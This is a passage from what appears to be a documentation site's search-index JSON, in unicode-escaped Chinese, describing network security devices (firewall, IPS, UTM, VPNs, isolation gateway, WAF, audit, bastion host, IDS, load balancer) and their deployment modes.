\u3002\u65c1\u8def\u6a21\u5f0f\u53ef\u4ee5\u5206\u4e3a\u65c1\u8def\u76d1\u542c\u6a21\u5f0f\u548c\u65c1\u8def\u4ee3\u7406\u6a21\u5f0f\u3002</p>"},{"location":"Security_devices/Introduction/Deployment1/index.html#21","title":"2.1\u65c1\u8def\u76d1\u542c\u6a21\u5f0f","text":"<p>\u6240\u8c13\u7684\u65c1\u8def\u76d1\u542c\u6a21\u5f0f\uff0c\u6307\u5b89\u5168\u8bbe\u5907\u90e8\u7f72\u4e8e\u4ea4\u6362\u673a\u65c1\u8def\uff0c\u901a\u8fc7\u914d\u7f6e\u4ea4\u6362\u673a\u955c\u50cf\u529f\u80fd\uff0c\u5c06\u8fdb\u51fa\u53e3\u6d41\u91cf\u4e00\u6a21\u4e00\u6837\u955c\u50cf\u4e00\u4efd\u7ed9\u5b89\u5168\u8bbe\u5907\uff0c\u539f\u6709\u6d41\u91cf\u8d70\u5411\u4e0d\u53d8\u3002\u5b89\u5168\u8bbe\u5907\u901a\u8fc7\u955c\u50cf\u6d41\u91cf\u5bf9\u7f51\u7edc\u3001\u5e94\u7528\u7cfb\u7edf\u72b6\u6001\u8fdb\u884c\u76d1\u542c\u3001\u68c0\u6d4b\u548c\u5206\u6790\u3002</p>"},{"location":"Security_devices/Introduction/Deployment1/index.html#22","title":"2.2\u65c1\u8def\u4ee3\u7406\u6a21\u5f0f","text":"<p>\u5b89\u5168\u8bbe\u5907\u5de5\u4f5c\u4e8e\u65c1\u8def\u4ee3\u7406\u6a21\u5f0f\u65f6\uff0c\u8bbe\u5907\u76f8\u5f53\u4e8e\u4ee3\u7406\u7f51\u5173\u3002\u6b64\u65f6\uff0c\u9700\u8981\u66f4\u6539\u7f51\u7edc\u914d\u7f6e\uff0c\u5c06\u6240\u6709\u7684\u7f51\u7edc\u6570\u636e\u53ca\u8bbf\u95ee\u6d41\u91cf\u6307\u5411\u65c1\u8def\u7684\u5b89\u5168\u8bbe\u5907\uff0c\u7ecf\u8fc7\u5b89\u5168\u8bbe\u5907\u8fc7\u6ee4\u540e\uff0c\u518d\u8fd4\u56de\u4ea4\u6362\u673a\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u65c1\u8def\u76d1\u542c\u6a21\u5f0f\u65f6\uff0c\u8fdb\u51fa\u7684\u6d41\u91cf\u8d70\u5411\u4e0e\u672a\u52a0\u5b89\u5168\u8bbe\u5907\u65f6\u65e0\u4efb\u4f55\u53d8\u5316\uff0c\u53ea\u662f\u901a\u8fc7\u4ea4\u6362\u673a\u5c06\u8fdb\u51fa\u6d41\u91cf\u955c\u50cf\u4e00\u4efd\u7ed9\u5b89\u5168\u8bbe\u5907\u3002</p> <p>\u65c1\u8def\u4ee3\u7406\u6a21\u5f0f\u65f6\uff0c\u8fdb\u51fa\u7684\u6d41\u91cf\u9996\u5148\u7ecf\u8fc7\u5b89\u5168\u8bbe\u5907\uff0c\u5b89\u5168\u8bbe\u5907\u5bf9\u6570\u636e\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u540e\uff0c\u518d\u5c06\u6570\u636e\u8fd4\u8fd8\u7ed9\u4ea4\u6362\u673a\u3002</p> <p>\u54ea\u4e9b\u8bbe\u5907\u7528\u8fd9\u4e24\u79cd\u65c1\u8def\u6a21\u5f0f\uff1f\u4f18\u7f3a\u70b9\u662f\u4ec0\u4e48\uff1f \u5e38\u89c1\u7684\u65c1\u8def\u90e8\u7f72\u7684\u8bbe\u5907\u4e00\u822c\u662fIDS\u3001\u8d1f\u8f7d\u5747\u8861\u3001\u6f0f\u6d1e\u626b\u63cf\u7b49\u68c0\u6d4b\u5206\u6790\u7c7b\u7684\u8bbe\u5907\u3002 \u65c1\u8def\u76d1\u542c\u6a21\u5f0f\u90e8\u7f72\u65b9\u5f0f\u7b80\u5355\uff0c\u8bbe\u5907\u4e0a\u4e0b\u7ebf\u5bf9\u7f51\u7edc\u6ca1\u6709\u4efb\u4f55\u5f71\u54cd\u3002\u4f46\u662f\u7531\u4e8e\u662f\u955c\u50cf\u6d41\u91cf\uff0c\u5b89\u5168\u8bbe\u5907\u53ea\u80fd\u770b\uff0c\u5f88\u96be\u5bf9\u7f51\u7edc\u6d41\u91cf\u8fdb\u884c\u62e6\u622a\u3001\u8fc7\u6ee4\u7b49\u64cd\u4f5c\uff0c\u529f\u80fd\u7a0d\u5fae\u7b80\u5355\u3002</p> <p>\u65c1\u8def\u4ee3\u7406\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u8fc7\u6ee4\u3001\u62e6\u622a\u3001\u91cd\u5206\u53d1\u529f\u80fd\uff0c\u4f46\u662f\u90e8\u7f72\u65b9\u5f0f\u8f83\u4e3a\u590d\u6742\uff0c\u800c\u4e14\u8bbe\u5907\u6545\u969c\u540e\uff0c\u4f1a\u5bf9\u7f51\u7edc\u4ea7\u751f\u91cd\u5927\u5f71\u54cd\uff0c\u6545\u969c\u6062\u590d\u65f6\u95f4\u8f83\u957f\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html","title":"1.\u9632\u706b\u5899\uff08 Firewall\uff09","text":"<p>\u5b9a\u4e49:\u7528\u4e8e\u4fdd\u62a4\u8ba1\u7b97\u673a\u7f51\u7edc\u514d\u53d7\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u7684\u5b89\u5168\u7cfb\u7edf\u3002\u5b83\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u76d1\u63a7\u548c\u63a7\u5236\u8fdb\u51fa\u7f51\u7edc\u7684\u6570\u636e\u6d41\uff0c\u786e\u4fdd\u53ea\u6709\u5408\u6cd5\u548c\u5b89\u5168\u7684\u6570\u636e\u80fd\u591f\u901a\u8fc7\u3002</p> <p>\u529f\u80fd:\u9632\u706b\u5899\u7684\u529f\u80fd\u4e3b\u8981\u662f\u4e24\u4e2a\u7f51\u7edc\u4e4b\u95f4\u505a\u8fb9\u754c\u9632\u62a4\uff0c \u4f01\u4e1a\u4e2d\u66f4\u591a\u4f7f\u7528\u7684\u662f\u4f01\u4e1a\u5185\u7f51\u4e0e\u4e92\u8054\u7f51\u7684NAT\u3001\u5305\u8fc7\u6ee4\u89c4\u5219\u3001\u7aef\u53e3\u6620\u5c04\u7b49\u529f\u80fd\u3002\u751f\u4ea7\u7f51\u4e0e\u529e\u516c\u7f51\u4e2d\u505a\u903b\u8f91\u9694\u79bb\u4f7f\u7528\uff0c\u4e3b\u8981\u529f\u80fd\u662f\u5305\u8fc7\u6ee4\u89c4\u5219\u7684\u4f7f\u7528\u3002</p> <p>\u90e8\u7f72\u65b9\u5f0f:\u7f51\u5173\u6a21\u5f0f\u3001\u900f\u660e\u6a21\u5f0f</p> <p>\u7f51\u5173\u6a21\u5f0f\u662f\u73b0\u5728\u7528\u7684\u6700\u591a\u7684\u6a21\u5f0f\uff0c\u53ef\u4ee5\u66ff\u4ee3\u8def\u7531\u5668\u5e76\u63d0\u4f9b\u66f4\u591a\u7684\u529f\u80fd\uff0c\u9002\u7528\u4e8e\u5404\u79cd\u7c7b\u578b\u4f01\u4e1a\u900f\u660e\u90e8\u7f72\u662f\u5728\u4e0d\u6539\u53d8\u73b0\u6709\u7f51\u7edc\u7ed3\u6784\u7684\u60c5\u51b5\u4e0b\uff0c\u5c06\u9632\u706b\u5899\u4ee5\u900f\u660e\u7f51\u6865\u7684\u6a21\u5f0f\u4e32\u8054\u5230\u4f01\u4e1a\u7684\u7f51\u7edc\u4e2d\u95f4\uff0c\u901a\u8fc7\u5305\u8fc7\u6ee4\u89c4\u5219\u8fdb\u884c\u8bbf\u95ee\u63a7\u5236\uff0c\u505a\u5b89\u5168\u57df\u7684\u5212\u5206\u3002\u81f3\u4e8e\u4ec0\u4e48\u65f6\u5019\u4f7f\u7528\u7f51\u5173\u6a21\u5f0f\u6216\u8005\u4f7f\u7528\u900f\u660e\u6a21\u5f0f\uff0c\u9700\u8981\u6839\u636e\u81ea\u8eab78uy8\u9700\u8981\u51b3\u5b9a\uff0c\u6ca1\u6709\u7edd\u5bf9\u7684\u90e8\u7f72\u65b9\u5f0f\u3002\u9700\u4e0d\u9700\u8981\u5c06\u670d\u52a1\u5668\u90e8\u7f72\u5728 DMZ\u533a\uff0c\u53d6\u51b3\u4e8e\u670d\u52a1\u5668\u7684\u6570\u91cf\u3001\u91cd\u8981\u6027\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#2-ips","title":"2.\u5165\u4fb5\u9632\u5fa1 (IPS)","text":"<p>\u5b9a\u4e49:\u76f8\u5bf9\u4e8e\u9632\u706b\u5899\u6765\u8bf4\uff0c\u4e00\u822c\u90fd\u5177\u6709\u9632\u706b\u5899\u7684\u529f\u80fd\uff0c\u9632\u5fa1\u7684\u5bf9\u8c61\u66f4\u5177\u6709\u9488\u5bf9\u6027\uff0c \u90a3\u5c31\u662f\u653b\u51fb\u3002\u9632\u706b\u5899\u662f\u901a\u8fc7\u5bf9\u4e94\u5143\u7ec4\u8fdb\u884c\u63a7\u5236\uff0c\u8fbe\u5230\u5305\u8fc7\u6ee4\u7684\u6548\u679c\uff0c\u800c\u5165\u4fb5\u9632\u5fa1 IPS\uff0c\u5219\u662f\u5c06\u6570\u636e\u5305\u8fdb\u884c\u68c0\u6d4b \uff08\u6df1\u5ea6\u5305\u68c0\u6d4b DPI\uff09\u5bf9\u8815\u866b\u3001\u75c5\u6bd2\u3001\u6728\u9a6c\u3001\u62d2\u7edd\u670d\u52a1\u7b49\u653b\u51fb\u8fdb\u884c\u67e5\u6740\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#3-utm","title":"3.\u7edf\u4e00\u5a01\u80c1\u5b89\u5168\u7f51\u5173 (UTM)","text":"<p>\u5b9a\u4e49:\u7b80\u5355\u7684\u7406\u89e3\uff0c\u628a\u5305\u8fc7\u6ee4\u3001\u75c5\u6bd2\u8fc7\u6ee4\u3001\u5165\u4fb5\u8fc7\u6ee4\u4e09\u4e2a\u5927\u529f\u80fd\u6574\u5408\u5230\u4e00\u8d77</p> <p>\u529f\u80fd:\u540c\u65f6\u5177\u5907\u9632\u706b\u5899\u3001\u9632\u75c5\u6bd2\u3001\u5165\u4fb5\u9632\u62a4\u529f\u80fd\u3002</p> <p>\u90e8\u7f72\u65b9\u5f0f:\u56e0\u4e3a\u53ef\u4ee5\u4ee3\u66ff\u9632\u706b\u5899\u529f\u80fd\uff0c\u6240\u4ee5\u90e8\u7f72\u65b9\u5f0f\u540c\u9632\u706b\u5899</p> <p>\u73b0\u5728\u5927\u591a\u6570\u5382\u5546\uff0c\u9632\u75c5\u6bd2\u548c\u5165\u4fb5\u9632\u62a4\u5df2\u7ecf\u4f5c\u4e3a\u9632\u706b\u5899\u7684\u6a21\u5757\u6765\u7528\uff0c\u5728\u4e0d\u8003\u8651\u786c\u4ef6\u6027\u80fd\u4ee5\u53ca\u8d39\u7528\u7684\u60c5\u51b5\u4e0b\uff0c\u5f00\u542f\u4e86\u9632\u75c5\u6bd2\u6a21\u5757\u548c\u5165\u4fb5\u9632\u62a4\u6a21\u5757\u7684\u9632\u706b\u5899\uff0c\u548cUTM\u5176\u5b9e\u662f\u4e00\u6837\u7684\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#4ipsec-vpn","title":"4.IPSEC VPN","text":"<p>\u628a IPSECVPN\u653e\u5230\u7f51\u7edc\u5b89\u5168\u9632\u62a4\u91cc\uff0c\u5176\u5b9e\u662f\u56e0\u4e3a\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c IPSEC VPN\u7684\u4f7f\u7528\u90fd\u662f\u901a\u8fc7\u4e0a\u8ff0\u8bbe\u5907\u6765\u505a\u7684\uff0c\u800c\u4e14\u901a\u8fc7\u52a0\u5bc6\u96a7\u9053\u8bbf\u95ee\u7f51\u7edc\uff0c\u672c\u8eab\u4e5f\u662f\u5bf9\u7f51\u7edc\u7684\u4e00\u79cd\u5b89\u5168\u9632\u62a4\u3002</p> <p>\u5b9a\u4e49:\u91c7\u7528 IPSec \u534f\u8bae\u6765\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u5165\u7684\u4e00\u79cd VPN\u6280\u672f</p> <p>\u529f\u80fd:\u901a\u8fc7\u4f7f\u7528 IPSECVPN\u4f7f\u5ba2\u6237\u7aef\u6216\u4e00\u4e2a\u7f51\u7edc\u4e0e\u53e6\u5916\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u8d77\u6765\uff0c\u591a\u6570\u7528\u5728\u5206\u652f\u673a\u6784\u4e0e\u603b\u90e8\u8fde\u63a5\u3002</p> <p>\u90e8\u7f72\u65b9\u5f0f:\u7f51\u5173\u6a21\u5f0f\u3001\u65c1\u8def\u6a21\u5f0f</p> <p>\u9274\u4e8e\u7f51\u5173\u7c7b\u8bbe\u5907\u57fa\u672c\u90fd\u5177\u5907 IPSECVPN\u529f\u80fd\uff0c\u6240\u4ee5\u5f88\u591a\u60c5\u51b5\u4e0b\u90fd\u662f\u76f4\u63a5\u5728\u7f51\u5173\u8bbe\u5907\u4e0a\u542f\u7528 IPSEC VPN\u529f\u80fd\uff0c\u4e5f\u6709\u4e2a\u522b\u60c5\u51b5\u65b0\u8d2d\u4e70IPSEC VPN\u8bbe\u5907\uff0c\u5728\u5bf9\u73b0\u6709\u7f51\u7edc\u6ca1\u6709\u5f71\u54cd\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u65c1\u8def\u90e8\u7f72\uff0c\u90e8\u7f72\u540e\u9700\u8981\u5bf9IPSECVPN\u8bbe\u5907\u653e\u901a\u5b89\u5168\u89c4\u5219\uff0c\u505a\u7aef\u53e3\u6620\u5c04\u7b49\u7b49\u3002\u4e5f\u53ef\u4ee5\u4f7f\u7528 windows server\u6216linu \u90e8\u7f72 VPN\uff0c\u76f8\u6bd4\u786c\u4ef6\u8bbe\u5907\uff0c\u81ea\u5df1\u90e8\u7f72\u6ca1\u6709\u4ec0\u4e48\u82b1\u8d39\uff0c\u4f46 IPSECVPN\u53d7\u64cd\u4f5c\u7cfb\u7edf\u5f71\u54cd\uff0c\u76f8\u6bd4\u786c\u4ef6\u8bbe\u5907\u7a33\u5b9a\u6027\u4f1a\u5dee\u4e00\u4e9b\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#5ssl-vpn","title":"5.SSL VPN","text":"<p>\u5b9a\u4e49:\u91c7\u7528 SSL\u534f\u8bae\u7684\u4e00\u79cd VPN\u6280\u672f\uff0c\u76f8\u6bd4 IPSEC VPN\u4f7f\u7528\u8d77\u6765\u8981\u66f4\u52a0\u65b9\u4fbf\uff0c\u6bd5\u7adf SSL VPN\u4f7f\u7528\u6d4f\u89c8\u5668\u5373\u53ef\u4f7f\u7528\u3002</p> <p>\u529f\u80fd:\u968f\u7740\u79fb\u52a8\u529e\u516c\u7684\u5feb\u901f\u53d1\u5c55\uff0cSSL VPN\u7684\u4f7f\u7528\u4e5f\u8d8a\u6765\u8d8a\u591a\uff0c\u9664\u4e86\u79fb\u52a8\u529e\u516c\u4f7f\u7528\uff0c\u901a\u8fc7\u6d4f\u89c8\u5668\u767b\u5f55SSLVPN\u8fde\u63a5\u5230\u5176\u4ed6\u7f51\u7edc\u4e5f\u5341\u5206\u65b9\u4fbf\uff0c IPSEC VPN\u66f4\u503e\u5411\u7f51\u7edc\u63a5\u5165\uff0c\u800c SSL VPN\u66f4\u503e\u5411\u5bf9\u5e94\u7528\u53d1\u5e03</p> <p>\u90e8\u7f72:SSL VPN\u7684\u90e8\u7f72\u4e00\u822c\u91c7\u7528\u65c1\u8def\u90e8\u7f72\u65b9\u5f0f\uff0c\u5728\u4e0d\u6539\u53d8\u7528\u6237\u7f51\u7edc\u7684\u72b6\u51b5\u4e0b\u5b9e\u73b0\u79fb\u52a8\u529e\u516c\u7b49\u529f\u80fd\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#6","title":"6.\u7f51\u95f8/\u5149\u95f8","text":"<p>\u5b9a\u4e49:\u5168\u79f0\u5b89\u5168\u9694\u79bb\u7f51\u95f8\u3002\u5b89\u5168\u9694\u79bb\u7f51\u95f8\u662f\u4e00\u79cd\u7531\u5e26\u6709\u591a\u79cd\u63a7\u5236\u529f\u80fd\u4e13\u7528\u786c\u4ef6\u5728\u7535\u8def\u4e0a\u5207\u65ad\u7f51\u7edc\u4e4b\u95f4\u7684\u94fe\u8def\u5c42\u8fde\u63a5\uff0c \u5e76\u80fd\u591f\u5728\u7f51\u7edc\u95f4\u8fdb\u884c\u5b89\u5168\u9002\u5ea6\u7684\u5e94\u7528\u6570\u636e\u4ea4\u6362\u7684\u7f51\u7edc\u5b89\u5168\u8bbe\u5907</p> <p>\u529f\u80fd:\u4e3b\u8981\u662f\u5728\u4e24\u4e2a\u7f51\u7edc\u4e4b\u95f4\u505a\u9694\u79bb\u5e76\u9700\u8981\u6570\u636e\u4ea4\u6362\uff0c\u7f51\u95f8\u662f\u5177\u6709\u4e2d\u56fd\u7279\u8272\u7684\u4ea7\u54c1\u3002</p> <p>\u90e8\u7f72\u65b9\u5f0f:\u4e24\u5957\u7f51\u7edc\u4e4b\u95f4</p> <p>\u9632\u706b\u4e00\u822c\u5728\u4e24\u5957\u7f51\u7edc\u4e4b\u95f4\u505a\u903b\u8f91\u9694\u79bb\uff0c \u800c\u7f51\u95f8\u7b26\u5408\u76f8\u5173\u8981\u6c42\uff0c\u53ef\u4ee5\u505a\u7269\u7406\u9694\u79bb\uff0c\u963b\u65ad\u7f51\u7edc\u4e2d tcp \u7b49\u534f\u8bae\uff0c\u4f7f\u7528\u79c1\u6709\u534f\u8bae\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#7waf","title":"7.WAF","text":"<p>\u5b9a\u4e49:\u540d\u79f0\u5c31\u53ef\u4ee5\u770b\u51fa\uff0cWAF\u7684\u9632\u62a4\u65b9\u9762\u662f web\u5e94\u7528\uff0c\u8bf4\u767d\u4e86\u9632\u62a4\u7684\u5bf9\u8c61\u662f\u7f51\u7ad9\u53ca B/S \u7ed3\u6784\u7684\u5404\u7c7b\u7cfb\u7edf\u3002</p> <p>\u529f\u80fd:\u9488\u5bf9 HTTP/HTTPS\u534f\u8bae\u8fdb\u884c\u5206\u6790\uff0c\u5bf9 SQL\u6ce8\u5165\u653b\u51fb\u3001XSS\u653b\u51fb Web\u653b\u51fb\u8fdb\u884c\u9632\u62a4\uff0c\u5e76\u5177\u5907\u57fa\u4e8e URL \u7684\u8bbf\u95ee\u63a7\u5236\uff1bHTTP\u534f\u8bae\u5408\u89c4\uff1bWeb\u654f\u611f\u4fe1\u606f\u9632\u62a4\uff1b\u6587\u4ef6\u4e0a\u4f20\u4e0b\u8f7d\u63a7\u5236\uff1bWeb \u8868\u5355\u5173\u952e\u5b57\u8fc7\u6ee4\u3002\u7f51\u9875\u6302\u9a6c\u9632\u62a4\uff0cWebshell \u9632\u62a4\u4ee5\u53ca web\u5e94\u7528\u4ea4\u4ed8\u7b49\u529f\u80fd\u3002</p> <p>\u90e8\u7f72:\u901a\u5e38\u90e8\u7f72\u5728 web\u5e94\u7528\u670d\u52a1\u5668\u524d\u8fdb\u884c\u9632\u62a4</p> <p>IPS \u4e5f\u80fd\u68c0\u6d4b\u51fa\u90e8\u5206web\u653b\u51fb\uff0c\u4f46\u6ca1\u6709WAF\u9488\u5bf9\u6027\u5f3a\uff0c\u6240\u4ee5\u6839\u636e\u9632\u62a4\u5bf9\u8c61\u4e0d\u540c\u9009\u7528\u4e0d\u540c\u8bbe\u5907\uff0c\u6548\u679c\u66f4\u597d\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#8","title":"8.\u7f51\u7edc\u5b89\u5168\u5ba1\u8ba1","text":"<p>\u5b9a\u4e49:\u5ba1\u8ba1\u7f51\u7edc\u65b9\u9762\u7684\u76f8\u5173\u5185\u5bb9</p> <p>\u529f\u80fd:\u9488\u5bf9\u4e92\u8054\u7f51\u884c\u4e3a\u63d0\u4f9b\u6709\u6548\u7684\u884c\u4e3a\u5ba1\u8ba1\u3001\u5185\u5bb9\u5ba1\u8ba1\u3001\u884c\u4e3a\u62a5\u8b66\u3001\u884c\u4e3a\u63a7\u5236\u53ca\u76f8\u5173\u5ba1\u8ba1\u529f\u80fd\u3002\u6ee1\u8db3\u7528\u6237\u5bf9\u4e92\u8054\u7f51\u884c\u4e3a\u5ba1\u8ba1\u5907\u6848\u53ca\u5b89\u5168\u4fdd\u62a4\u63aa\u65bd\u7684\u8981\u6c42\uff0c\u63d0\u4f9b\u5b8c\u6574\u7684\u4e0a\u7f51\u8bb0\u5f55\uff0c\u4fbf\u4e8e\u4fe1\u606f\u8ffd\u8e2a\u3001\u7cfb\u7edf\u5b89\u5168\u7ba1\u7406\u548c\u98ce\u9669\u9632\u8303\u3002</p> <p>\u90e8\u7f72:\u91c7\u7528\u65c1\u8def\u90e8\u7f72\u6a21\u5f0f\uff0c\u901a\u8fc7\u5728\u6838\u5fc3\u4ea4\u6362\u673a\u4e0a\u8bbe\u7f6e\u955c\u50cf\u53e3\uff0c\u5c06\u955c\u50cf\u6570\u636e\u53d1\u9001\u5230\u5ba1\u8ba1\u8bbe\u5907\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#9","title":"9.\u5821\u5792\u673a","text":"<p>\u5b9a\u4e49:\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u7f51\u7edc\u73af\u5883\u4e0b\uff0c \u4e3a\u4e86\u4fdd\u969c\u7f51\u7edc\u548c\u6570\u636e\u4e0d\u53d7\u6765\u81ea\u5185\u90e8\u5408\u6cd5\u7528\u6237\u7684\u4e0d\u5408\u89c4\u64cd\u4f5c\u5e26\u6765\u7684\u7cfb\u7edf\u635f\u574f\u548c\u6570\u636e\u6cc4\u9732\uff0c \u800c\u8fd0\u7528\u5404\u79cd\u6280\u672f\u624b\u6bb5\u5b9e\u65f6\u6536\u96c6\u548c\u76d1\u63a7\u7f51\u7edc\u73af\u5883\u4e2d\u6bcf\u4e00\u4e2a\u7ec4\u6210\u90e8\u5206\u7684\u7cfb\u7edf\u72b6\u6001\u3001\u5b89\u5168\u4e8b\u4ef6\u3001\u7f51\u7edc\u6d3b\u52a8\uff0c\u4ee5\u4fbf\u96c6\u4e2d\u62a5\u8b66\u3001\u8bb0\u5f55\u3001\u5206\u6790\u3001\u5904\u7406\u7684\u4e00\u79cd\u6280\u672f\u624b\u6bb5\u3002</p> <p>\u529f\u80fd:\u4e3b\u8981\u662f\u9488\u5bf9\u8fd0\u7ef4\u4eba\u5458\u7ef4\u62a4\u8fc7\u7a0b\u7684\u5168\u9762\u8ddf\u8e2a\u3001 \u63a7\u5236\u3001\u8bb0\u5f55\u3001\u56de\u653e\uff0c\u4ee5\u5e2e\u52a9\u5185\u63a7\u5de5\u4f5c\u4e8b\u524d\u89c4\u5212\u9884\u9632\u3001\u4e8b\u4e2d\u5b9e\u65f6\u76d1\u63a7\u3001\u8fdd\u89c4\u884c\u4e3a\u54cd\u5e94\u3001\u4e8b\u540e\u5408\u89c4\u62a5\u544a\u3001\u4e8b\u6545\u8ffd\u8e2a\u56de\u653e\u3002</p> <p>\u90e8\u7f72:\u65c1\u8def\u6a21\u5f0f\u90e8\u7f72\u3002\u4f7f\u7528\u9632\u706b\u5899\u5bf9\u670d\u52a1\u5668\u8bbf\u95ee\u6743\u9650\u8fdb\u884c\u9650\u5236\uff0c\u53ea\u80fd\u901a\u8fc7\u5821\u5792\u673a\u5bf9\u7f51\u7edc\u8bbe\u5907/\u670d\u52a1\u5668/\u6570\u636e\u5e93\u7b49\u7cfb\u7edf\u64cd\u4f5c\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#10ids","title":"10.\u5165\u4fb5\u68c0\u6d4b\uff08IDS\uff09","text":"<p>\u5b9a\u4e49:\u5bf9\u5165\u4fb5\u653b\u51fb\u884c\u4e3a\u8fdb\u884c\u68c0\u6d4b</p> <p>\u529f\u80fd:\u901a\u8fc7\u5bf9\u8ba1\u7b97\u673a\u7f51\u7edc\u6216\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u82e5\u5e72\u5173\u952e\u70b9\u6536\u96c6\u4fe1\u606f\u5e76\u5bf9\u5176\u8fdb\u884c\u5206\u6790\uff0c \u4ece\u4e2d\u53d1\u73b0\u7f51\u7edc\u6216\u7cfb\u7edf\u4e2d\u662f\u5426\u6709\u8fdd\u53cd\u5b89\u5168\u7b56\u7565\u7684\u884c\u4e3a\u548c\u88ab\u653b\u51fb\u7684\u8ff9\u8c61</p> <p>\u90e8\u7f72:\u91c7\u7528\u65c1\u8def\u90e8\u7f72\u6a21\u5f0f\uff0c\u901a\u8fc7\u5728\u6838\u5fc3\u4ea4\u6362\u673a\u4e0a\u8bbe\u7f6e\u955c\u50cf\u53e3\uff0c\u5c06\u955c\u50cf\u6570\u636e\u53d1\u9001\u5230\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\u3002</p>"},{"location":"Security_devices/Introduction/Deployment2/index.html#11","title":"11.\u8d1f\u8f7d\u5747\u8861","text":"<p>\u5b9a\u4e49:\u5c06\u7f51\u7edc\u6216\u5e94\u7528\u591a\u4e2a\u5de5\u4f5c\u5206\u644a\u8fdb\u884c\u5e76\u540c\u65f6\u5b8c\u6210\uff0c\u4e00\u822c\u5206\u4e3a\u94fe\u8def\u8d1f\u8f7d\u548c\u5e94\u7528\u8d1f\u8f7d ( \u670d\u52a1\u5668\u8d1f\u8f7d )</p> <p>\u529f\u80fd:\u786e\u4fdd\u7528\u6237\u7684\u4e1a\u52a1\u5e94\u7528\u80fd\u591f\u5feb\u901f\u3001\u5b89\u5168\u3001\u53ef\u9760\u5730\u4ea4\u4ed8\u7ed9\u5185\u90e8\u5458\u5de5\u548c\u5916\u90e8\u670d\u52a1\u7fa4,\u6269\u5c55\u7f51\u7edc\u8bbe\u5907\u548c\u670d\u52a1\u5668\u7684\u5e26\u5bbd\u3001\u589e\u52a0\u541e\u5410\u91cf\u3001\u52a0\u5f3a\u7f51\u7edc\u6570\u636e\u5904\u7406\u80fd\u529b\u3001\u63d0\u9ad8\u7f51\u7edc\u7684\u7075\u6d3b\u6027\u548c\u53ef\u7528\u6027</p> <p>\u90e8\u7f72:\u65c1\u8def\u6a21\u5f0f\u3001\u7f51\u5173\u6a21\u5f0f\u3001\u4ee3\u7406\u6a21\u5f0f</p> <p>\u65c1\u8def\u6a21\u5f0f:\u901a\u5e38\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u8fdb\u884c\u5e94\u7528\u8d1f\u8f7d\u65f6\uff0c\u65c1\u8def\u90e8\u7f72\u5728\u76f8\u5173\u5e94\u7528\u670d\u52a1\u5668\u4ea4\u6362\u673a\u4e0a\uff0c\u8fdb\u884c\u5e94\u7528\u8d1f\u8f7d</p> <p>\u7f51\u5173\u6a21\u5f0f:\u901a\u5e38\u4f7f\u7528\u94fe\u8def\u8d1f\u8f7d\u65f6\uff0c\u4f7f\u7528\u7f51\u5173\u6a21\u5f0f\u90e8\u7f72</p>"},{"location":"Security_devices/Introduction/FW1/index.html","title":"\u9632\u706b\u5899\u4ecb\u7ecd#1","text":""},{"location":"Security_devices/Introduction/FW1/index.html#1_1","title":"1.\u4ec0\u4e48\u662f\u9632\u706b\u5899\uff1f","text":"<p>\u9632\u706b\u5899\uff0c\u6307\u7531\u8f6f\u4ef6\u548c\u786c\u4ef6\u8bbe\u5907\u7ec4\u5408\u800c\u6210\u3001\u5728\u5185\u90e8\u7f51\u548c\u5916\u90e8\u7f51\u4e4b\u95f4\u3001\u5c40\u57df\u7f51\u4e0e\u5916\u7f51\u4e4b\u95f4\u7684\u4fdd\u62a4\u5c4f\u969c\u3002\u7528\u4e8e\u4fdd\u62a4\u8ba1\u7b97\u673a\u7f51\u7edc\u514d\u53d7\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u7684\u5b89\u5168\u7cfb\u7edf\u3002\u5b83\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u76d1\u63a7\u548c\u63a7\u5236\u8fdb\u51fa\u7f51\u7edc\u7684\u6570\u636e\u6d41\uff0c\u786e\u4fdd\u53ea\u6709\u5408\u6cd5\u548c\u5b89\u5168\u7684\u6570\u636e\u80fd\u591f\u901a\u8fc7\u3002</p> <p>\u529f\u80fd:\u9632\u706b\u5899\u7684\u529f\u80fd\u4e3b\u8981\u662f\u4e24\u4e2a\u7f51\u7edc\u4e4b\u95f4\u505a\u8fb9\u754c\u9632\u62a4\uff0c \u4f01\u4e1a\u4e2d\u66f4\u591a\u4f7f\u7528\u7684\u662f\u4f01\u4e1a\u5185\u7f51\u4e0e\u4e92\u8054\u7f51\u7684NAT\u3001\u5305\u8fc7\u6ee4\u89c4\u5219\u3001\u7aef\u53e3\u6620\u5c04\u7b49\u529f\u80fd\u3002\u751f\u4ea7\u7f51\u4e0e\u529e\u516c\u7f51\u4e2d\u505a\u903b\u8f91\u9694\u79bb\u4f7f\u7528\uff0c\u4e3b\u8981\u529f\u80fd\u662f\u5305\u8fc7\u6ee4\u89c4\u5219\u7684\u4f7f\u7528\u3002</p> 